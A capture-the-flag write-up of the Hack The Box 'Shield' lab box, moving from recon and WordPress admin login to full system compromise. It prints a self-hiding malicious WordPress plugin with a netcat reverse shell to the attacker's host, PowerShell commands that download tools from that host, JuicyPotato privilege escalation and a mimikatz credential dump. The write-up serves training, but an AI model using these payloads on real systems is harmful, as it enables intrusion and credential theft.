## HTB Starting Point: Shield

`Shield` is a 4th box from Starting Point path on [HackTheBox.eu](https://app.hackthebox.eu). This path is composed of 9 boxes in a way that later boxes use information (in a form of credentials) gathered from the previous ones.

This box features only a root flag. Don't waste your time on finding the `user.txt` - until this is corrected by the Dev Team. I've raised this issue already, so this article will be updated accordingly when status is changed. UPDATE: Apparently this is solved right now and information "No Flag" for user flag is shown correctly both for `Shield` and `Vaccine`.

***
# Contents

1. [Basic Information](#basic-information)
2. [Target of Evaluation](#target-of-evaluation)
3. [Recon](#recon)
4. [WordPress Admin Panel Access](#wordpress-admin-panel-access)
5. [Weaponize](#weaponize)
6. [Exploiting Low Privilege Shell Access](#exploiting-low-privilege-shell-access)
7. [Vulnerability Scanning](#vulnerability-scanning)
8. [Exploiting](#exploiting)
9. [Post-exploitation](#post-exploitation)
10. [Cleanup](#cleanup)
11. [Additional Readings](#additional-readings)
***

# Basic Information

| #     |   |
|:--    |:--|
| Type    | Starting Point
|Name    | **Hack The Box / Shield**
|Pwned | 2021/06/03
|URLs    | https://app.hackthebox.eu/machines/290
|Author  | **Asentinn** / OkabeRintaro
|       | [https://ctftime.org/team/152207](https://ctftime.org/team/152207)

%%[bmac-button]

# Target of Evaluation

Machine is accessible on port `10.10.10.29`.

# Recon

Fire up port scan (`-A` for OS detection, version detection, script scanning, and traceroute):

```txt
$ nmap -A 10.10.10.29

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 00:17 CEST
Nmap scan report for 10.10.10.29
Host is up (0.045s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
```

Trying to connect to the MySQL instance:

```txt
$ mysql -h 10.10.10.29
ERROR 1130 (HY000): Host '10.10.XX.XXX' is not allowed to connect to this MySQL server
```

Oh, so that's what _unauthorized_ from `nmap` scan meant.

Grabbing hosting data from HTTP headers (just in case):

```
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.1.29
```

Web directory enumeration:
```txt
$ gobuster dir -w /usr/wl/dirbuster-m.txt -x txt,php -u http://10.10.10.29
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/wl/dirbuster-m.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/06/03 00:17:19 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 152] [--> http://10.10.10.29/wordpress/]
Progress: 50817 / 661683 (7.68%)
[!] Keyboard interrupt detected, terminating.

===============================================================
2021/06/03 00:21:02 Finished
===============================================================
```

It is a WordPress installation, so after a while with no other paths pop up, I'm terminating the `gobuster`.

[Back to top](#contents) ⤴

# WordPress Admin panel access 


![WordPress landing page](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251101474/unPjJjvzE.png)

## `/wp-login.php`

I'm trying the known so far usernames and password from the previous boxes: `admin/P@s5w0rd!` lets me in.

It looks just like basic WP installation without internet access (errors from update feature and no plugin store). 

[Back to top](#contents) ⤴

# Weaponize

To get access to the web server I'm going to upload a payload with `netcat` binary and PHP file that establish reverse shell to my host.

### pshield_plugin.php

> This code hides plugin on the admin panel so it won't be easy tracked by other hackers

```php
<?php
    /*
   Plugin Name: It's Not A Reverse Shell Plugin
   Plugin URI: https://blog.cyberethical.me/
   description: A plugin that definitely is not creating a revershe shell.
   Version: 1.0
   Author: Asentinn
   Author URI: https://blog.cyberethical.me/
   License: MIT
   */

   function plugin_hide_pshield() {
    global $wp_list_table;
    $hidearr = array('pshield_plugin/pshield_plugin.php');
    $myplugins = $wp_list_table->items;
    foreach ($myplugins as $key => $val) {
      if (in_array($key,$hidearr)) {
        unset($wp_list_table->items[$key]);
      }
    }
  }

  remove_action('pre_current_active_plugins', 'plugin_hide_pshield');
  add_action('pre_current_active_plugins', 'plugin_hide_pshield');
?>
```

### wp_config.php

> Executes reverse PowerShell

```php
# wp_config.php

<?php
  system("nc342as.exe -e powershell.exe 10.10.XX.XXX 9002")
?>
```

### wp_cleanup.php

> Allows to remotely delete the contents of the plugin, leaving only the main plugin file with the dummy data.
> This way if you want to update the payload, call this file and then deactivate and remove Example plugin.

```php
# wp_cleanup.php

<?php

file_put_contents("pshield_plugin.php", base64_decode("PD9waHAgICAKLyoKICAgUGx1Z2luIE5hbWU6IEV4YW1wbGUKICAgUGx1Z2luIFVSSTogaHR0cHM6Ly9leGFtcGxlLmNvbQogICBkZXNjcmlwdGlvbjogCiAgIFZlcnNpb246IDEuMAogICBBdXRob3I6IE1lCiAgIEF1dGhvciBVUkk6IGh0dHBzOi8vZXhhbXBsZS5jb20KICAgTGljZW5zZTogTUlUCiAgICovCj8+Cg=="));

unlink("wp_config.php");
unlink("nc342as.exe");
unlink(__FILE__);

?>
```

### pshield_plugin.zip

> Plugin archive ready for upload

```
$ zip pshield_plugin.zip *
  adding: nc342as.exe (deflated 53%)
  adding: pshield_plugin.php (deflated 45%)
  adding: wp_cleanup.php (deflated 38%)
  adding: wp_config.php (deflated 6%)

```

[Back to top](#contents) ⤴

# Exploiting (low privilege shell access)

> 🔔 `CyberEthical.Me` is maintained purely from your donations - if you would like to boost the community, consider one-time sponsoring at the 🍻 [Buymeacoffee](https://www.buymeacoffee.com/asentinn) or use the [Sponsor](/sponsor) button.

After uploading the plugin and activating it, each time I want to get the PS reverse shell I start `netcat` listener and navigate to the following URL:

`http://10.10.10.29/wordpress/wp-content/plugins/pshield_plugin/wp_config.php`

Also, as you can see - plugin is not visible. The only thing that reveals it is running is a number of visible plugins in comparison to All number on GUI.


![201644566290.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251171589/0tDJKU9YA.png)

## Reverse shell (low privilege)

Trying to get database connection details from `wp-config.php`:

```
PS C:\inetpub\wwwroot\wordpress> cat wp-config.php

<?php

// ...

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress124');

/** MySQL database username */
define('DB_USER', 'wordpressuser124');

/** MySQL database password */
define('DB_PASSWORD', 'P_-U9dA6q.B|');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

// ...

```

Copied for later use:
* Database: `wordpress124`
* Credentials: `wordpressuser124/P_-U9dA6q.B|`

## Database enumeration

By using `mysql` I am looking for the cached credentials and sensitive information that will help me find a flag.

```txt
mysql --user=wordpressuser124 --password='P_-U9dA6q.B|' --database=wordpress124 -e "select * from wp_users;"

ID	user_login	user_pass	user_nicename	user_email	user_url	user_registered	user_activation_key	user_status	display_name
1	admin	$P$Bgz58wVx7mKpwW3AcNv6VNstbMeyQ30	admin	shield@hackthebox.eu		2020-02-04 15:40:47	1622581404:$P$BrWeD9Vdxf2/vtWQsEO7hJAlOAGkMQ0	0	admin
```

With a help of [WP Sec resource](https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/)  I'm trying to guess the password stored in `pass.hash` using `rockyou` wordlist:

```sh
$ hashcat -O -m 400 -a 0 -o pass.txt pass.hash /usr/wl/rockyou.txt
```

Meanwhile, I'm dumping data from other tables, but nothing useful come up.

In a gesture of resignation I'm downloading the [winPEAS](/linpeas) from my Python simple server.

```
(New-Object System.Net.WebClient).DownloadFile('http://10.10.XX.XXX/pea3r3efr.exe','pea3r3efr.exe');
```

At that time `hashcat` finished its work and because he didn't manage to guess it, with high probability this is a dead end.

```txt
Session..........: hashcat
Status...........: Exhausted
Hash.Name........: phpass
Hash.Target......: $P$Bgz58wVx7mKpwW3AcNv6VNstbMeyQ30
Time.Started.....: Sat Jun  5 20:37:23 2021 (10 mins, 25 secs)
Time.Estimated...: Sat Jun  5 20:47:48 2021 (0 secs)
Guess.Base.......: File (/usr/wl/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    17321 H/s (4.31ms) @ Accel:1024 Loops:256 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
```

[Back to top](#contents) ⤴

# Vulnerability scanning

Some of the more interesting findings from `winPEAS`

## Host details

```
Hostname: Shield
    Domain Name: MEGACORP.LOCAL
    ProductName: Windows Server 2016 Standard
    EditionID: ServerStandard
    ReleaseId: 1607
    BuildBranch: rs1_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 6/2/2021 4:09:48 PM
    HighIntegrity: False
    PartOfDomain: True
    Hotfixes:

```

## LSA and credentials

* [Hacktricks - LSA Protection](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection)
* [Hacktricks - Credential Guard](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard)
* [Hacktricks - Cached Credentials](https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials)

```
[+] LAPS Settings
   [?] If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

  [+] Wdigest
   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
    Wdigest is not enabled

  [+] LSA Protection
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

  [+] Credentials Guard
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

  [+] Cached Creds
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

  [+] AV Information
  [X] Exception: Invalid class 
    No AV was detected!!
    Not Found

//...

[+] UAC Status
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.

//...

[+] Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

// ...

[+] Enumerating Named Pipes
  Name                                                                                                 Sddl

  eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  vgauth-service                                                                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)

```

## Users and groups

* [Hacktricks - User and Groups](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups)

```
Current user: IUSR
  Current groups: Everyone, Users, Console Logon, Authenticated Users, This Organization, Local
   =================================================================================================

    SHIELD\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    SHIELD\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    SHIELD\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq
```

## Token manipulation

* [Hacktricks - Token Manipulation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation)


![3866525911244.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251198796/qbilIKloK.png)

![3276092796401.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251207942/kFOB0QoEy.png)

* [Hacktricks - Services](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services)

![5024207238878.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251222989/i9nw4dQRG.png)

```
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft 

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName          
-------  ------    -----      -----     ------     --  -- -----------          
     57       4     1916       3528       0.02   3096   0 cmd                  
     85       7     1148       5548       0.02   3664   0 conhost              
    330      13     1852       4148               376   0 csrss                
    222      15     1800       4016               492   1 csrss                
    215      13     3692      12856              2456   0 dllhost              
    363      25    19616      44360               856   1 dwm                  
   1281      52    19748      71400              3592   1 explorer             
      0       0        0          4                 0   0 Idle                 
    414      20     9716      36940              3996   1 LockApp              
    336      17    10176      41840              2828   1 LockAppHost          
    452      22    14836      34136              3188   1 LogonUI              
    892      27     5144      14820               624   0 lsass                
    224      17    16708      17424              1748   0 MsDepSvc             
    190      13     2872       9884              2724   0 msdtc                
    496      66   142284     133208              1848   0 MsMpEng              
  42843      11    92972      29528              1720   0 mysqld               
    107       8     1088       4548       0.05   4108   0 nc342as              
    125      18    30188      37856              3392   0 php-cgi              
    128      18    29688      37452              4632   0 php-cgi              
    656      36    53276      63652       1.50   4428   0 powershell           
    336      19     8948      26132              3984   1 RuntimeBroker        
    557      28    12052      44020              1700   1 SearchUI             
    264      10     3616       7828               616   0 services             
    674      28    14268      44832               908   1 ShellExperienceHost  
    377      15     3840      18220              4028   1 sihost               
     51       2      388       1224               276   0 smss                 
    429      22     5920      16296              1580   0 spoolsv              
    890       0      128        140                 4   0 System               
    250      16     2892      13728              3004   1 taskhostw            
    140      11     3088      10240              1860   0 VGAuthService        
    105       7     1368       5668              1148   0 vm3dservice          
    105       8     1484       6660              3288   1 vm3dservice          
    335      21     8972      20716              1812   0 vmtoolsd             
    201      17     4980      14812              3528   1 vmtoolsd             
    221      28     6856      15316              3320   0 w3wp                 
     93       9     1052       4976               484   0 wininit              
    201      10     2152      15924               560   1 winlogon             
    322      21    10064      25276              2600   0 WmiPrvSE             
    250      13    10884      19484              3160   0 WmiPrvSE             
    195      12     3124      11292              4676   0 WmiPrvSE 

```

[Back to top](#contents) ⤴

# Exploiting 

One thing should raise your attention is that **SeImpersonatePrivilege** is set. This is causing a potential vulnerability that can be exploited using JuicyPotato (read more in _Additional readings_ section)

```
echo START C:\inetpub\wwwroot\wordpress\wp-content\plugins\pshield_plugin\nc342as.exe -e powershell.exe 10.10.XX.XXX 9004 > jp52345.bat
.\jp324d.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\plugins\pshield_plugin\jp52345.bat -l 9004 -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```
![3380900278873.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251252596/RzX2H0MSI.png)

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
6******************************a
```

[Back to top](#contents) ⤴

# Post-exploitation

Because I've got the System access and I know that future boxes can use some credentials from this one - I'm downloading the `mimikatz` to read the logged in `sandra` user.

```
powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.XX.XXX/mc231.exe','mc231.exe')"
```

![3284913879648.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251295188/eVPGYeEMk2.png)

## Read credentials from a memory

```
mimikatz # privilege::debug
Privilege '20' OK
```

Useless information are truncated from below output.

```
mimikatz # sekurlsa::logonpasswords

// ...

Authentication Id : 0 ; 291603 (00000000:00047313)
Session           : Interactive from 1
User Name         : sandra
Domain            : MEGACORP
Logon Server      : PATHFINDER
Logon Time        : 6/7/2021 4:13:28 PM
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
	msv :	
	 [00000003] Primary
	 * Username : sandra
	 * Domain   : MEGACORP
	 * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
	 * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
	 * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
	tspkg :	
	wdigest :	
	 * Username : sandra
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : sandra
	 * Domain   : MEGACORP.LOCAL
	 * Password : Password1234!
	ssp :	
	credman :	

//...
```

![4471246112768.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251315581/3nfKecIUZ.png)

[Back to top](#contents) ⤴

# Cleanup

Before `wp_cleanup.php` call

![2092810927112.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251327359/n5FahK14t.png)
After:

![3898421797298.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251341291/f_sbgkWKm.png)

> Remember to close all shells before deleting plugin from WordPress admin.

![1307054891438.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1623251351948/mnC0rIa7D.png)


> Like what you see? Join the [Hashnode.com](/join) now. Things that are awesome:

>✔ Automatic GitHub Backup

>✔ Write in Markdown

>✔ Free domain mapping

>✔ CDN hosted images

>✔ Free in-built newsletter service

> By using my link you can help me unlock the ambasador role, which cost you nothing and gives me some additional features to support my content creation mojo.

[Back to top](#contents) ⤴

# Additional Readings

> 📌 Follow the `#CyberEthical` hashtag on the social media

> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)

> 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek/)

> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)

> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)

* [Impersonating Privileges with Juicy Potato by Nairuz Abulhul](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)
* [CLIDs: Windows Server 2016 Standard](http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/)
* [Hacktricks - Privilege Escalation Abusing Tokens](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)
* [What is mimikatz](https://www.varonis.com/blog/what-is-mimikatz/)
* [Mimikatz and Active Directory Kerberos Attacks](https://adsecurity.org/?p=556)